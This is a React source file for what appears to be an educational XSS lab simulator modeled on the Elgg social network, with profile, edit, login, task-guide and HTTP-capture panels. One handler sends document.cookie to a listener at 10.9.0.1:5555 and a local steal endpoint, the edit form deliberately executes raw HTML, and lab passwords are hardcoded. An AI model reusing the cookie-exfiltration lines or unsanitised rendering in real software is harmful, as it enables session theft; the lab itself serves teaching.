                  <div style={{ background:EG.contentBg, border:`1px solid ${EG.contentBdr}`, borderRadius:4, padding:'12px 14px', marginBottom:10 }}>
                    <div style={{ display:'flex', alignItems:'flex-start', justifyContent:'space-between', gap:12 }}>
                      <div style={{ display:'flex', alignItems:'center', gap:12 }}>
                        <ElggAvatar user={viewingProfile} size={64} />
                        <div>
                          <div style={{ fontSize:18, fontWeight:700, color:EG.labelDark, marginBottom:2 }}>{USER_DISPLAY[viewingProfile]}</div>
                          <div style={{ fontSize:11, color:EG.mutedTxt, marginBottom:6 }}>guid: {USER_GUIDS[viewingProfile]}</div>
                          {p?.briefDesc ? <BriefDescRenderer html={p.briefDesc} viewer={loggedIn} owner={viewingProfile} onXssEvent={handleXssEvent} /> : <div style={{ fontSize:12, color:EG.mutedTxt, fontStyle:'italic' }}>No brief description</div>}
                        </div>
                      </div>
                      <div style={{ display:'flex', flexDirection:'column', gap:6, alignItems:'flex-end' }}>
                        {isOwn ? <>
                          <ElggBtn onClick={()=>{ setEditForm({ briefDesc:p?.briefDesc||'', aboutMe:p?.aboutMe||'' }); setEditHtml(false); setPage('edit'); }}>✏️ Edit Profile</ElggBtn>
                          <ElggBtn small variant="secondary" onClick={() => {
                            const payload = detectXssPayload(p?.aboutMe);
                            if (payload?.type === 'steal' && p?.aboutMeEditHtml) {
                              const studentId = window.__xssLabStudentId || 'default';
                              const img = new Image(); img.src = `http://localhost:3001/steal?c=${encodeURIComponent(document.cookie)}&student=${studentId}`; document.body.appendChild(img);
                              const img2 = new Image(); img2.src = `http://10.9.0.1:5555?c=${encodeURIComponent(document.cookie)}`; document.body.appendChild(img2);
                              if (onEvent) onEvent('steal_self', loggedIn);
                            }
                            const u = viewingProfile; setViewingProfile(null); setTimeout(()=>handleVisitProfile(u),50);
                          }}>🔄 Refresh</ElggBtn>
                        </> : <>
                          {!ownerFriends.includes(loggedIn) && <ElggBtn onClick={async () => {
                            setProfiles(prev => ({ ...prev, [viewingProfile]: { ...prev[viewingProfile], friends:[...(prev[viewingProfile].friends||[]),loggedIn] } }));
                            try {
                              const studentId = window.__xssLabStudentId||'default'; const ts=Date.now();
                              await fetch(`http://localhost:3001/elgg/action/friends/add?friend=${USER_GUIDS[viewingProfile]}&__elgg_ts=${ts}&__elgg_token=lab_token_${ts}&student=${studentId}`, { method:'GET', credentials:'include', headers:{'X-Student-ID':studentId} });
                            } catch {}
                          }}>+ Add Friend</ElggBtn>}
                          <ElggBtn small variant="secondary" onClick={()=>{ const u=viewingProfile; setViewingProfile(null); setTimeout(()=>handleVisitProfile(u),50); }}>🔄 Reload</ElggBtn>
                        </>}
                        {!isOwn && ownerFriends.includes(loggedIn) && <span style={{ fontSize:11, color:EG.green, background:EG.greenBg, border:'1px solid #a8d8a8', borderRadius:3, padding:'3px 8px' }}>✓ Friends</span>}
                      </div>
                    </div>
                  </div>
                  <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:10 }}>
                    <div>
                      <ElggWidget title="About Me">
                        <AboutMeRenderer html={p?.aboutMe} viewer={loggedIn} owner={viewingProfile} onXssEvent={handleXssEvent} editHtmlUsed={p?.aboutMeEditHtml || false} />
                      </ElggWidget>
                      <ElggWidget title={`${USER_DISPLAY[viewingProfile]}'s Friends (${ownerFriends.length})`}>
                        {ownerFriends.length > 0 ? (
                          <div style={{ display:'flex', flexWrap:'wrap', gap:8 }}>
                            {ownerFriends.map(f => (
                              <div key={f} style={{ textAlign:'center', cursor:'pointer' }} onClick={()=>handleVisitProfile(f)}>
                                <ElggAvatar user={f} size={32} />
                                <div style={{ fontSize:10, color:EG.linkBlue, marginTop:2 }}>{USER_DISPLAY[f]}</div>
                              </div>
                            ))}
                          </div>
                        ) : <span style={{ color:EG.mutedTxt, fontStyle:'italic', fontSize:12 }}>No friends yet</span>}
                        {!isOwn && ownerFriends.includes('samy') && (
                          <div style={{ marginTop:8, padding:'6px 8px', background:'#f0fdf0', border:'1px solid #a8d8a8', borderRadius:3, fontSize:10, color:'#1a6b1a' }}>
                            ✅ <strong>XSS Success (Task 3):</strong> Samy was silently added to {USER_DISPLAY[viewingProfile]}'s friends.
                          </div>
                        )}
                      </ElggWidget>
                    </div>
                    <div>
                      <ElggWidget title="Wire"><div style={{ fontSize:12, color:EG.mutedTxt, fontStyle:'italic' }}>No wire posts yet.</div></ElggWidget>
                      <ElggWidget title="User Details">
                        <table style={{ width:'100%', fontSize:11, borderCollapse:'collapse' }}>
                          <tbody>
                            <tr><td style={{ color:EG.mutedTxt, padding:'3px 0', width:80 }}>Username</td><td style={{ color:EG.labelDark, fontWeight:700 }}>{viewingProfile}</td></tr>
                            <tr><td style={{ color:EG.mutedTxt, padding:'3px 0' }}>GUID</td><td style={{ fontFamily:'monospace', color:EG.labelDark }}>{USER_GUIDS[viewingProfile]}</td></tr>
                            <tr><td style={{ color:EG.mutedTxt, padding:'3px 0' }}>Member since</td><td style={{ color:EG.labelDark }}>Jan 2026</td></tr>
                          </tbody>
                        </table>
                      </ElggWidget>
                    </div>
                  </div>
                </div>
              );
            })()}

            {page==='edit' && (
              <div style={{ background:EG.contentBg, border:`1px solid ${EG.contentBdr}`, borderRadius:4, padding:'14px 16px' }}>
                <div style={{ fontSize:15, fontWeight:700, color:EG.sectionHdr, marginBottom:14, borderBottom:`1px solid ${EG.contentBdr}`, paddingBottom:8 }}>Edit Profile — {USER_DISPLAY[loggedIn]}</div>
                <div style={{ display:'flex', flexDirection:'column', gap:14 }}>
                  <div>
                    <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:4 }}>
                      <label style={{ fontSize:12, fontWeight:700, color:EG.labelDark }}>Brief Description</label>
                      <label style={{ fontSize:10, color:EG.mutedTxt }}>Accepts raw HTML — scripts execute directly</label>
                    </div>
                    <input value={editForm.briefDesc} onChange={e=>setEditForm(p=>({...p,briefDesc:e.target.value}))} placeholder="A short description of yourself..."
                      style={{ width:'100%', border:`1px solid ${EG.inputBdr}`, borderRadius:3, padding:'6px 8px', fontSize:12, fontFamily:'Verdana,Geneva,sans-serif', outline:'none', boxSizing:'border-box' }}
                      onFocus={e=>e.target.style.borderColor=EG.inputFocus} onBlur={e=>e.target.style.borderColor=EG.inputBdr} />
                  </div>
                  <div>
                    <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:4 }}>
                      <label style={{ fontSize:12, fontWeight:700, color:EG.labelDark }}>About Me</label>
                      <label style={{ display:'flex', alignItems:'center', gap:5, fontSize:11, cursor:'pointer',
                        color: editHtml ? '#cc3333' : EG.linkBlue, fontWeight: editHtml ? 700 : 400,
                        background: editHtml ? '#fdf0f0' : 'transparent', border: editHtml ? '1px solid #f5a0a0' : 'none',
                        borderRadius:4, padding:editHtml?'2px 6px':'0' }}>
                        <input type="checkbox" checked={editHtml} onChange={e=>setEditHtml(e.target.checked)} />
                        Edit HTML {editHtml ? '⚠️ Raw HTML mode — scripts will execute!' : '(required for XSS payloads)'}
                      </label>
                    </div>
                    
                    {!editHtml && <ElggEditorToolbar />}
                    <textarea value={editForm.aboutMe} onChange={e=>setEditForm(p=>({...p,aboutMe:e.target.value}))} rows={6}
                      placeholder={editHtml?'✅ Edit HTML mode active — paste your XSS payload here':'Tell us about yourself... (tick Edit HTML to inject payloads)'}
                      style={{ width:'100%', border:`1px solid ${editHtml?'#cc3333':EG.inputBdr}`, borderRadius:editHtml?3:'0 0 3px 3px', padding:'8px 10px', fontSize:editHtml?12:13, fontFamily:editHtml?"'Courier New',monospace":'Verdana,Geneva,sans-serif', outline:'none', resize:'vertical', boxSizing:'border-box', lineHeight:1.6, background:editHtml?'#fff8f8':'#fff' }}
                      onFocus={e=>e.target.style.borderColor=editHtml?'#cc3333':EG.inputFocus}
                      onBlur={e=>e.target.style.borderColor=editHtml?'#cc3333':EG.inputBdr} />
                    {editHtml && (
                      <div style={{ background:'#fdf0f0', border:'1px solid #f5a0a0', borderTop:'none', borderRadius:'0 0 3px 3px', padding:'5px 10px', fontSize:10, color:'#cc3333' }}>
                        ✅ Raw HTML mode active — &lt;script&gt; tags will be stored and executed when victims view this profile
                      </div>
                    )}
                  </div>
                  <div style={{ display:'flex', gap:8, paddingTop:6, borderTop:`1px solid ${EG.contentBdr}` }}>
                    <ElggBtn onClick={handleSaveProfile}>Save Profile</ElggBtn>
                    <ElggBtn variant="secondary" onClick={()=>{ setPage('profile'); setViewingProfile(loggedIn); }}>Cancel</ElggBtn>
                  </div>
                </div>
              </div>
            )}

            {page==='activity' && (
              <ElggWidget title="All Site Activity">
                {allUsers.map(u => {
                  const p = profiles[u]; const hasScript = /<script/i.test(p?.aboutMe||'');
                  return (
                    <div key={u} style={{ display:'flex', gap:8, marginBottom:10, paddingBottom:10, borderBottom:`1px solid ${EG.sectionHdrBdr}` }}>
                      <ElggAvatar user={u} size={32} />
                      <div style={{ flex:1, fontSize:12 }}>
                        <ElggLink onClick={()=>handleVisitProfile(u)} style={{ fontWeight:700 }}>{USER_DISPLAY[u]}</ElggLink>
                        {hasScript ? <span style={{ color:EG.red }}> stored an <strong>XSS payload</strong>{p?.aboutMeEditHtml?' (Edit HTML used)':' (Edit HTML NOT used — may be sanitised)'}</span>
                          : p?.briefDesc ? <span style={{ color:EG.labelDark }}> updated brief description</span>
                          : <span style={{ color:EG.mutedTxt }}> joined the network</span>}
                      </div>
                    </div>
                  );
                })}
              </ElggWidget>
            )}
          </div>
        </div>
      </div>
    );
  }

  function ElggLoginForm({ onLogin }) {
    const [user,setUser]=useState(''); const [pass,setPass]=useState(''); const [err,setErr]=useState('');
    const CREDS={ admin:'seedadmin', alice:'seedalice', boby:'seedboby', charlie:'seedcharlie', samy:'seedsamy' };
    const attempt=()=>{ if(CREDS[user.trim()]===pass.trim()){setErr('');onLogin(user.trim(),pass.trim());}else setErr('The username/password combination you entered is incorrect.'); };
    return (
      <div style={{ background:EG.pageBg, minHeight:400, display:'flex', alignItems:'center', justifyContent:'center', fontFamily:'Verdana,Geneva,sans-serif', borderRadius:8, border:`1px solid ${EG.contentBdr}`, flexDirection:'column', gap:16, padding:24 }}>
        <div style={{ fontSize:32, fontWeight:900, color:'#e67e00', letterSpacing:-2, fontFamily:'Georgia,serif' }}>elgg</div>
        <div style={{ background:EG.contentBg, border:`1px solid ${EG.contentBdr}`, borderRadius:4, padding:'20px 24px', width:320 }}>
          <div style={{ fontSize:14, fontWeight:700, color:EG.sectionHdr, marginBottom:14 }}>Log in</div>
          {err && <div style={{ background:EG.redBg, border:`1px solid ${EG.redBdr}`, borderRadius:3, padding:'8px 10px', marginBottom:12, fontSize:12, color:EG.red }}>{err}</div>}
          <div style={{ display:'flex', flexDirection:'column', gap:10, marginBottom:14 }}>
            <div><label style={{ display:'block', fontSize:12, fontWeight:700, color:EG.labelDark, marginBottom:3 }}>Username</label>
              <input value={user} onChange={e=>setUser(e.target.value)} autoFocus placeholder="username" style={{ width:'100%', border:`1px solid ${EG.inputBdr}`, borderRadius:3, padding:'6px 8px', fontSize:12, fontFamily:'Verdana,Geneva,sans-serif', outline:'none', boxSizing:'border-box' }} onFocus={e=>e.target.style.borderColor=EG.inputFocus} onBlur={e=>e.target.style.borderColor=EG.inputBdr} /></div>
            <div><label style={{ display:'block', fontSize:12, fontWeight:700, color:EG.labelDark, marginBottom:3 }}>Password</label>
              <input type="password" value={pass} onChange={e=>setPass(e.target.value)} onKeyDown={e=>e.key==='Enter'&&attempt()} placeholder="password" style={{ width:'100%', border:`1px solid ${EG.inputBdr}`, borderRadius:3, padding:'6px 8px', fontSize:12, fontFamily:'Verdana,Geneva,sans-serif', outline:'none', boxSizing:'border-box' }} onFocus={e=>e.target.style.borderColor=EG.inputFocus} onBlur={e=>e.target.style.borderColor=EG.inputBdr} /></div>
          </div>
          <ElggBtn onClick={attempt} style={{ width:'100%' }}>Log in</ElggBtn>
          <div style={{ marginTop:12, padding:10, background:'#f8f9fa', border:`1px solid ${EG.contentBdr}`, borderRadius:3, fontSize:10, color:EG.labelDark }}>
            <strong>Lab accounts:</strong><br/>samy / seedsamy · alice / seedalice<br/>boby / seedboby · charlie / seedcharlie
          </div>
        </div>
      </div>
    );
  }



  // ── MISSION PANEL ─────────────────────────────────────────────────────────────
  function MissionPanel({ task, completedMissions, isDarkMode=true }) {
    const C = getTheme(isDarkMode);
    const steps = MISSION_STEPS[task.id] || [];
    if (steps.length === 0) return null;
    const done = steps.filter(s => completedMissions.includes(s.id)).length;
    const total = steps.length;
    const allDone = done === total;
    const pct = Math.round((done/total)*100);
    return (
      <div style={{ border:`1px solid ${allDone?'rgba(0,212,170,0.4)':C.border}`, borderRadius:10, overflow:'hidden', background:C.bgSec }}>
        <div style={{ padding:'10px 14px', borderBottom:`1px solid ${allDone?'rgba(0,212,170,0.2)':C.border}`, display:'flex', alignItems:'center', justifyContent:'space-between' }}>
          <span style={{ fontSize:12, fontWeight:700, color:allDone?C.accent:C.text }}>{allDone?'🏆 Task Complete':'Mission Objectives'}</span>
          <span style={{ fontSize:11, color:allDone?C.accent:C.faint }}>{done}/{total}</span>
        </div>
        <div style={{ height:3, background:C.border2 }}>
          <div style={{ height:'100%', width:`${pct}%`, background:allDone?C.accent:C.blue, transition:'width 0.4s ease', borderRadius:99 }} />
        </div>
        <div style={{ padding:'10px 14px', display:'flex', flexDirection:'column', gap:6 }}>
          {steps.map((step, i) => {
            const isDone = completedMissions.includes(step.id);
            const isNext = !isDone && (i===0 || completedMissions.includes(steps[i-1]?.id));
            return (
              <div key={step.id} style={{ display:'flex', alignItems:'flex-start', gap:9, padding:'7px 10px', borderRadius:7, background:isDone?'rgba(0,212,170,0.06)':isNext?'rgba(88,166,255,0.05)':'transparent', border:`1px solid ${isDone?'rgba(0,212,170,0.18)':isNext?'rgba(88,166,255,0.12)':'transparent'}` }}>
                <div style={{ flexShrink:0, width:18, height:18, borderRadius:'50%', marginTop:1, display:'flex', alignItems:'center', justifyContent:'center', fontSize:9, fontWeight:800, background:isDone?C.accent:isNext?'rgba(88,166,255,0.2)':C.bgHov, border:`1px solid ${isDone?C.accent:isNext?'rgba(88,166,255,0.35)':C.border}`, color:isDone?'#0d1117':isNext?C.blue:C.faint }}>
                  {isDone?'✓':i+1}
                </div>
                <div style={{ flex:1 }}>
                  <div style={{ fontSize:12, color:isDone?C.muted:isNext?C.text:C.faint, lineHeight:1.45, textDecoration:isDone?'line-through':'none' }}>{step.label}</div>
                  {step.xp > 0 && <div style={{ fontSize:10, color:isDone?C.accent:C.faint, marginTop:2 }}>{isDone?`+${step.xp} XP earned`:isNext?`+${step.xp} XP · next up`:`+${step.xp} XP`}</div>}
                </div>
              </div>
            );
          })}
        </div>
      </div>
    );
  }

  // ── TASK GUIDE ─────────────────────────────────────────────────────────────────
  function TaskGuide({ task, session, completedMissions, onHint, hintsUsed, isDarkMode=true }) {
    const C = getTheme(isDarkMode);
    if (!task || !session) return <div style={{ display:'flex', alignItems:'center', justifyContent:'center', height:300, color:C.muted }}>Select a task to begin.</div>;
    const catColors = { Setup:{ bg:isDarkMode?'#1f2937':C.bgCard, text:C.blue, border:'rgba(88,166,255,0.3)' }, Exploit:{ bg:isDarkMode?'#3b1517':'#fef0f0', text:C.red, border:'rgba(248,81,73,0.3)' }, Defense:{ bg:isDarkMode?'#064e3b':'#f0fdf4', text:C.accent, border:'rgba(0,212,170,0.3)' } };
    const cat = catColors[task.category] || { bg:C.bgHov, text:C.muted, border:C.border };
    const isCompleted = session.tasks[task.id]?.completed;
    return (
      <div style={{ display:'flex', flexDirection:'column', gap:16, padding:'18px 20px', fontFamily:'system-ui,-apple-system,sans-serif' }}>
        <style>{`
          .task-content h3{font-size:15px;font-weight:700;color:${C.text};margin:16px 0 8px}
          .task-content p{font-size:13px;color:${C.muted};line-height:1.7;margin:0 0 10px}
          .task-content ul,.task-content ol{font-size:13px;color:${C.muted};line-height:1.8;padding-left:20px;margin:0 0 10px}
          .task-content li{margin-bottom:2px}
          .task-content strong{color:${C.text}}
          .task-content em{color:${C.yellow}}
          .task-content code{font-family:'JetBrains Mono',monospace;font-size:12px;background:${C.bgCard};padding:2px 6px;border-radius:4px;color:${C.blue}}
          .code-block{background:${C.bgSec};border:1px solid ${C.border};border-radius:10px;padding:14px 16px;margin:10px 0;overflow-x:auto}
          .code-copy-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px}
          .copy-btn{background:rgba(88,166,255,0.1);border:1px solid rgba(88,166,255,0.3);color:${C.blue};border-radius:5px;padding:3px 10px;font-size:10px;cursor:pointer;font-family:inherit;font-weight:600;white-space:nowrap}
          .copy-btn:hover{background:rgba(88,166,255,0.2)}
          .code-block pre{margin:0;font-size:12px;font-family:'JetBrains Mono',monospace;color:${C.text};white-space:pre-wrap;word-break:break-word}
          .code-block code{font-family:'JetBrains Mono',monospace;font-size:12px;background:none;padding:0;color:${C.text}}
          .info-box{background:rgba(88,166,255,0.08);border:1px solid rgba(88,166,255,0.25);border-radius:10px;padding:12px 14px;margin:10px 0;font-size:12px;color:${C.muted};line-height:1.7}
          .info-box strong{color:${C.text}}
          .warn-box{background:rgba(210,153,34,0.08);border:1px solid rgba(248,81,73,0.3);border-radius:10px;padding:12px 14px;margin:10px 0;font-size:12px;color:${C.red};line-height:1.7}
          .warn-box strong{color:${C.red}}
        `}</style>
        <div style={{ borderBottom:`1px solid ${C.border}`, paddingBottom:14 }}>
          <div style={{ display:'flex', alignItems:'center', gap:7, marginBottom:8, flexWrap:'wrap' }}>
            <span style={{ fontSize:10, fontWeight:700, letterSpacing:2, textTransform:'uppercase', background:C.bgHov, border:`1px solid ${C.border}`, color:C.muted, padding:'3px 8px', borderRadius:5 }}>Task {task.number}</span>
            <span style={{ fontSize:10, fontWeight:700, letterSpacing:2, textTransform:'uppercase', background:cat.bg, border:`1px solid ${cat.border}`, color:cat.text, padding:'3px 8px', borderRadius:5 }}>{task.category}</span>
            {task.id==='task6' && <span style={{ fontSize:10, fontWeight:700, letterSpacing:1, textTransform:'uppercase', background:'rgba(188,140,255,0.1)', border:'1px solid rgba(188,140,255,0.3)', color:C.purple, padding:'3px 8px', borderRadius:5 }}>Optional</span>}
            <span style={{ fontSize:11, color:C.muted, marginLeft:'auto' }}>🏁 <strong style={{ color:C.accent }}>{task.xp} XP</strong></span>
          </div>
          <h2 style={{ fontSize:18, fontWeight:800, color:C.text, margin:'0 0 4px', lineHeight:1.3 }}>{task.title}</h2>
          <p style={{ fontSize:12, color:C.muted, margin:0, lineHeight:1.5 }}>{task.description}</p>
        </div>
        <MissionPanel task={task} completedMissions={completedMissions} isDarkMode={isDarkMode} />
        <div className="task-content" dangerouslySetInnerHTML={{ __html: task.content }} />
        <div style={{ background:'rgba(0,212,170,0.07)', border:'1px solid rgba(0,212,170,0.25)', borderRadius:10, padding:'10px 14px', fontSize:12, color:C.accent, display:'flex', alignItems:'center', gap:10 }}>
          <span style={{ fontSize:18 }}>🤖</span>
          <span>Click the <strong>⚡ Quiz Me</strong> button (top-right) to get questions about Task {task.number} and earn XP for correct answers!</span>
        </div>
        {task.hints.length > 0 && (
          <button onClick={()=>onHint(task.id)} style={{ background:'rgba(210,153,34,0.08)', border:'1px solid rgba(210,153,34,0.3)', color:C.yellow, borderRadius:8, padding:'8px 14px', cursor:'pointer', fontSize:12, fontFamily:'inherit', fontWeight:600 }}>
            💡 Get Hint (-10 XP) · {task.hints.length - (hintsUsed[task.id]||0)} remaining
          </button>
        )}
        {isCompleted && (
          <div style={{ background:'rgba(0,212,170,0.08)', border:'1px solid rgba(0,212,170,0.25)', borderRadius:12, padding:16, textAlign:'center', fontSize:13, color:C.accent, fontWeight:700 }}>
            🏆 Task Completed! All simulator XP awarded.
          </div>
        )}
      </div>
    );
  }

  // ── HTTP HEADERS PANEL ────────────────────────────────────────────────────────
  function HttpHeadersPanel({ studentId, externalCaptures = [] }) {
    const [captures, setCaptures] = useState([]);
    const [selected, setSelected] = useState(null);
    const [isListening, setIsListening] = useState(false);
    const wsRef = useRef(null);

    useEffect(() => {
      if (!isListening || externalCaptures.length === 0) return;
      setCaptures(prev => {
        const existingIds = new Set(prev.map(c => c.id));
        const newOnes = externalCaptures.filter(c => !existingIds.has(c.id));
        if (newOnes.length === 0) return prev;
        const merged = [...prev, ...newOnes];
        setSelected(merged[merged.length - 1].id);
        return merged;
      });
    }, [externalCaptures, isListening]);

    useEffect(() => {
      if (!isListening || !studentId) return;
      const protocol = window.location.protocol==='https:'?'wss:':'ws:';
      try {
        const ws = new WebSocket(`${protocol}//localhost:3001/headers?student=${studentId}`);
        wsRef.current = ws;
        ws.onmessage = (e) => {
          try {
            const msg = JSON.parse(e.data);
            if (msg.type==='http_capture'&&msg.data) {
              setCaptures(prev => {
                const existingIds = new Set(prev.map(c => c.id));
                if (existingIds.has(msg.data.id)) return prev;
                const merged = [...prev, msg.data];
                setSelected(msg.data.id);
                return merged;
              });
            }
          } catch {}
        };
        ws.onerror = () => { /* Backend server not running — fail silently */ };
      } catch (err) {
        /* Backend server not running — HTTP Headers capture unavailable */ 
      }
      return () => { try { if (wsRef.current?.readyState===WebSocket.OPEN) wsRef.current.close(); } catch {} };
    }, [isListening, studentId]);

    const handleStart = () => setIsListening(true);
    const handleStop  = () => setIsListening(false);
    const handleClear = () => { setCaptures([]); setSelected(null); };
    const typeColor = { ADD_FRIEND:'#58a6ff', PROFILE_EDIT:'#00d4aa', COOKIE_STEAL:'#f85149', XHR:'#8b949e', FETCH:'#bc8cff' };
    const typeLabel = { ADD_FRIEND:'Add Friend GET (PDF §3)', PROFILE_EDIT:'Profile Edit POST (PDF §4)', COOKIE_STEAL:'Cookie Steal GET (PDF §2)', XHR:'XHR Request', FETCH:'Fetch Request' };
    const sel = captures.find(c=>c.id===selected);

    return (
      <div style={{ height:'100%', display:'flex', flexDirection:'column', background:'#0d1117', padding:16, gap:10, fontFamily:'system-ui,sans-serif' }}>
        <div style={{ display:'flex', alignItems:'center', gap:10, background:'#161b22', border:'1px solid #30363d', borderRadius:8, padding:'8px 14px', flexShrink:0, flexWrap:'wrap' }}>
          <span style={{ fontSize:13, fontWeight:700, color:C.text }}>📡 HTTP Live Headers</span>
          <span style={{ fontSize:10, color:C.muted, flex:1 }}>{isListening ? 'Capturing XSS attack requests in real-time.' : 'Click Start to begin capturing HTTP requests.'}</span>
          <button onClick={handleClear} style={{ background:'rgba(248,81,73,0.1)', border:'1px solid rgba(248,81,73,0.3)', color:'#f85149', borderRadius:6, padding:'4px 10px', fontSize:11, cursor:'pointer', fontFamily:'inherit' }}>🗑 Clear</button>
          {!isListening ? (
            <button onClick={handleStart} style={{ background:'rgba(63,185,80,0.15)', border:'1px solid rgba(63,185,80,0.4)', color:'#3fb950', borderRadius:6, padding:'4px 16px', fontSize:11, cursor:'pointer', fontFamily:'inherit', fontWeight:700 }}>▶ Start</button>
          ) : (
            <button onClick={handleStop} style={{ background:'rgba(248,81,73,0.15)', border:'1px solid rgba(248,81,73,0.4)', color:'#f85149', borderRadius:6, padding:'4px 16px', fontSize:11, cursor:'pointer', fontFamily:'inherit', fontWeight:700 }}>⏹ Stop</button>
          )}
          <span style={{ display:'flex', alignItems:'center', gap:5, background:isListening?'rgba(63,185,80,0.1)':'rgba(100,100,100,0.1)', border:`1px solid ${isListening?'rgba(63,185,80,0.3)':'rgba(100,100,100,0.3)'}`, color:isListening?'#3fb950':'#6e7681', borderRadius:6, padding:'4px 14px', fontSize:11, fontWeight:700 }}>
            <span style={{ width:8, height:8, borderRadius:'50%', background:isListening?'#3fb950':'#6e7681', display:'inline-block', animation:isListening?'pulse 1.5s infinite':'none' }} />
            {isListening ? 'Listening' : 'Stopped'}
          </span>
        </div>
        <style>{`@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }`}</style>
        {!isListening && captures.length === 0 && (
          <div style={{ flex:1, display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:16, color:C.muted, textAlign:'center', padding:24 }}>
            <span style={{ fontSize:40 }}>📡</span>
            <div>
              <div style={{ fontSize:14, fontWeight:700, color:C.text, marginBottom:8 }}>HTTP Header Capture</div>
              <div style={{ fontSize:12, color:C.muted, maxWidth:380, lineHeight:1.7 }}>Click <strong style={{ color:C.accent }}>▶ Start</strong> to begin capturing. Then perform XSS attacks — each forged request will appear here in real time.</div>
            </div>
            <button onClick={handleStart} style={{ background:`rgba(${parseInt(C.accent.slice(1,3),16)},${parseInt(C.accent.slice(3,5),16)},${parseInt(C.accent.slice(5,7),16)},0.15)`, border:`1px solid rgba(${parseInt(C.accent.slice(1,3),16)},${parseInt(C.accent.slice(3,5),16)},${parseInt(C.accent.slice(5,7),16)},0.4)`, color:C.accent, borderRadius:8, padding:'10px 32px', fontSize:13, cursor:'pointer', fontFamily:'inherit', fontWeight:700 }}>▶ Start Capturing</button>
          </div>
        )}
        {(isListening || captures.length > 0) && (
          <div style={{ flex:1, display:'flex', gap:10, minHeight:0 }}>
            <div style={{ width:270, flexShrink:0, background:'#161b22', border:'1px solid #30363d', borderRadius:8, display:'flex', flexDirection:'column', overflow:'hidden' }}>
              <div style={{ padding:'8px 12px', borderBottom:'1px solid #30363d', fontSize:11, fontWeight:700, color:'#8b949e', textTransform:'uppercase', letterSpacing:1 }}>Captured ({captures.length})</div>
              {captures.length === 0
                ? <div style={{ flex:1, display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:8, color:'#6e7681', fontSize:12, padding:16, textAlign:'center' }}><span style={{ fontSize:28 }}>📡</span><span>Perform XSS attacks in the Elgg Portal — requests will appear here.</span></div>
                : <div style={{ flex:1, overflowY:'auto' }}>
                    {captures.map(c => (
                      <div key={c.id} onClick={()=>setSelected(c.id)} style={{ padding:'8px 12px', borderBottom:'1px solid #21262d', cursor:'pointer', background:selected===c.id?'rgba(88,166,255,0.08)':'transparent', borderLeft:`3px solid ${selected===c.id?(typeColor[c.type]||'#8b949e'):'transparent'}` }}>
                        <div style={{ display:'flex', alignItems:'center', gap:6, marginBottom:3 }}>
                          <span style={{ fontSize:9, fontWeight:700, padding:'1px 5px', background:`${typeColor[c.type]||'#8b949e'}22`, color:typeColor[c.type]||'#8b949e', borderRadius:3 }}>{c.method}</span>
                          <span style={{ fontSize:9, color:'#8b949e' }}>{c.timestamp}</span>
                          <span style={{ marginLeft:'auto', fontSize:9, color:'#3fb950', fontWeight:700 }}>{c.responseStatus}</span>
                        </div>
                        <div style={{ fontSize:10, color:typeColor[c.type]||'#8b949e', fontWeight:600, marginBottom:2 }}>{typeLabel[c.type]||c.type}</div>
                        <div style={{ fontSize:10, color:'#6e7681', overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>{c.url}</div>
                      </div>
                    ))}
                  </div>}
            </div>
            <div style={{ flex:1, background:'#161b22', border:'1px solid #30363d', borderRadius:8, display:'flex', flexDirection:'column', overflow:'hidden' }}>
              {!sel
                ? <div style={{ flex:1, display:'flex', alignItems:'center', justifyContent:'center', color:'#6e7681', fontSize:12 }}>Select a captured request to inspect</div>
                : <>
                    <div style={{ padding:'10px 14px', borderBottom:'1px solid #30363d', display:'flex', alignItems:'center', gap:10, flexShrink:0 }}>
                      <span style={{ fontSize:11, fontWeight:700, padding:'2px 8px', background:`${typeColor[sel.type]||'#8b949e'}22`, color:typeColor[sel.type]||'#8b949e', borderRadius:4 }}>{sel.method}</span>
                      <span style={{ fontSize:11, color:'#e6edf3', fontWeight:600, wordBreak:'break-all', flex:1 }}>{sel.url}</span>
                      <span style={{ fontSize:11, color:'#3fb950', fontWeight:700, flexShrink:0 }}>{sel.responseStatus}</span>
                    </div>
                    <div style={{ flex:1, overflowY:'auto', padding:14, display:'flex', flexDirection:'column', gap:14 }}>
                      <div>
                        <div style={{ fontSize:10, fontWeight:700, textTransform:'uppercase', letterSpacing:1, color:'#8b949e', marginBottom:6 }}>Request Headers</div>
                        <div style={{ background:'#0d1117', border:'1px solid #30363d', borderRadius:6, padding:'10px 12px', fontFamily:"'JetBrains Mono',monospace", fontSize:11, lineHeight:1.9 }}>
                          <div style={{ color:'#58a6ff' }}>{sel.method} {sel.url.includes('?')?sel.url.split('?')[0]:sel.url} HTTP/1.1</div>
                          <div><span style={{ color:'#d29922' }}>Host:</span> <span style={{ color:'#e6edf3' }}>www.app.local</span></div>
                          {Object.entries(sel.requestHeaders||{}).map(([k,v])=>(
                            <div key={k}><span style={{ color:'#d29922' }}>{k}:</span>{' '}<span style={{ color:k.toLowerCase()==='cookie'?'#f85149':'#e6edf3', wordBreak:'break-all' }}>{String(v)}</span></div>
                          ))}
                        </div>
                      </div>
                      {sel.method === 'GET' && sel.url.includes('?') && (
                        <div>
                          <div style={{ fontSize:10, fontWeight:700, textTransform:'uppercase', letterSpacing:1, color:'#8b949e', marginBottom:6 }}>Query Parameters</div>
                          <div style={{ background:'#0d1117', border:'1px solid #30363d', borderRadius:6, padding:'10px 12px', fontFamily:"'JetBrains Mono',monospace", fontSize:11, lineHeight:1.9 }}>
                            {sel.url.split('?')[1].split('&').map((part,i)=>{
                              const eqIdx = part.indexOf('=');
                              const k = part.slice(0,eqIdx);
                              const v = eqIdx >= 0 ? decodeURIComponent(part.slice(eqIdx+1)) : '';
                              const isHighlight = k.includes('token')||k==='friend'||k.includes('ts');
                              return (
                                <div key={i}><span style={{ color:'#d29922' }}>{k}</span>=<span style={{ color:isHighlight?'#f85149':'#e6edf3' }}>{v}</span>
                                  {k==='friend' && <span style={{ color:'#8b949e', fontSize:10 }}> {'// Samy\'s GUID'}</span>}
                                  {k==='__elgg_ts' && <span style={{ color:'#8b949e', fontSize:10 }}> {'// CSRF timestamp'}</span>}
                                  {k==='__elgg_token' && <span style={{ color:'#8b949e', fontSize:10 }}> {'// CSRF token'}</span>}
                                </div>
                              );
